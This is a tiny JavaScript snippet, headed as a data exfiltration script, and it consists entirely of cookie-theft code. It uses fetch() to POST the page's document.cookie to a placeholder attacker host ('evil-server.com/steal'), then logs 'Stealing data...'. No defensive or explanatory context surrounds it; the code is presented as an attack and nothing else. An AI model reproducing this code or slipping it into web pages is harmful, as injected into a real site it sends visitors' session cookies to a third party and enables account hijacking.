// Data exfiltration script

fetch("http://evil-server.com/steal", {
  method: "POST",
  body: document.cookie
});

setTimeout(function() {
  console.log("Stealing data...");
}, 1000);
